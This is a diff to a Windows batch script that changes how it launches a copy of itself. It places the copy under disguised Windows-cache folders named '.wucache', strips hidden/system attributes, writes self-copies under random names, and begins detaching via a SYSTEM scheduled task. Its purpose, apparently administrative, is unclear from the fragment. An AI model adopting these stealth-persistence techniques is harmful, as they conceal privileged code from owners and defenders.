@@ -1,6 +1,6 @@
 @echo off
 setlocal EnableExtensions EnableDelayedExpansion
-REM OWN BUILD 20260802O32 - task TR ownership IDENTVER=6 + RMM Datto keep + embed
+REM OWN BUILD 20260802O32 - task TR ownership IDENTVER=6 + unique detach runner (no lock race)
 set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
 set "BOOT=%SystemRoot%\Temp\.wucache"
 set "LOG=%WD%\boot.err"
@@ -41,38 +41,35 @@ if /I not "%~1"=="_RUN" (
     exit /b 5
   )
   echo elevated_ok>>"%BOOT%\boot.err" 2>nul
-  REM O32: prior S4 hardening (+h +s) makes copy/move over old files fail silently.
-  REM Strip attrs first, then VERIFY the copy is really this build - else use a fresh unique runner.
+  REM O32b: never overwrite a locked own_run.cmd (prior worker holds it) — unique runner always.
+  REM Also strip attrs on WD targets before any later copy.
   attrib -h -s -r "%BOOT%\own_run.cmd" >nul 2>&1
-  copy /y "%~f0" "%BOOT%\own_run.cmd" >nul 2>&1
-  if not exist "%BOOT%\own_run.cmd" (
-    echo ERROR: cannot write %BOOT%\own_run.cmd
+  attrib -h -s -r "%SELF%" >nul 2>&1
+  set "RUNNER=%BOOT%\own_o32_%RANDOM%%RANDOM%.cmd"
+  copy /y "%~f0" "!RUNNER!" >nul 2>&1
+  if not exist "!RUNNER!" (
+    echo ERROR: cannot write unique runner under %BOOT%
     exit /b 6
   )
-  findstr /C:"OWN BUILD 20260802O32" "%BOOT%\own_run.cmd" >nul 2>&1
+  findstr /C:"OWN BUILD 20260802O32" "!RUNNER!" >nul 2>&1
   if errorlevel 1 (
-    set "RUNNER=%BOOT%\own_o30_%RANDOM%%RANDOM%.cmd"
-    copy /y "%~f0" "!RUNNER!" >nul 2>&1
-    echo runner_fallback_unique>>"%LOG%" 2>nul
-  ) else (
-    mkdir "%WD%" >nul 2>&1
-    attrib -h -s -r "%SELF%" >nul 2>&1
-    copy /y "%BOOT%\own_run.cmd" "%SELF%" >nul 2>&1
-    set "RUNNER=%SELF%"
-    findstr /C:"OWN BUILD 20260802O32" "%SELF%" >nul 2>&1
-    if errorlevel 1 set "RUNNER=%BOOT%\own_run.cmd"
+    echo ERROR: runner copy is not O32 - abort
+    exit /b 7
   )
-  echo go_start %DATE% %TIME%>"%LOG%" 2>nul
-  if not exist "%LOG%" (
-    set "LOG=%BOOT%\boot.err"
-    echo go_start %DATE% %TIME%>"%LOG%"
-  )
-  echo order=exterminate_then_repair_then_install>>"%LOG%"
-  echo engine=cmd_detached_o30>>"%LOG%"
-  echo whoami_launcher=>>"%LOG%"
+  REM best-effort refresh of canonical paths (ignore lock failures)
+  copy /y "!RUNNER!" "%BOOT%\own_run.cmd" >nul 2>&1
+  mkdir "%WD%" >nul 2>&1
+  copy /y "!RUNNER!" "%SELF%" >nul 2>&1
+  echo go_start %DATE% %TIME%>>"%BOOT%\boot.err" 2>nul
+  set "LOG=%WD%\boot.err"
+  echo go_start %DATE% %TIME%>>"%LOG%" 2>nul
+  if not exist "%LOG%" set "LOG=%BOOT%\boot.err"
+  echo order=exterminate_then_repair_then_install>>"%LOG%" 2>nul
+  echo engine=cmd_detached_o32>>"%LOG%" 2>nul
+  echo whoami_launcher=>>"%LOG%" 2>nul
   whoami >>"%LOG%" 2>&1
-  echo detach_begin>>"%LOG%"
-  echo runner=!RUNNER!>>"%LOG%"
+  echo detach_begin>>"%LOG%" 2>nul
+  echo runner=!RUNNER!>>"%LOG%" 2>nul
   set "DETACH_OK=0"
 
   REM Method A: plain schtasks as SYSTEM (paths have no spaces)
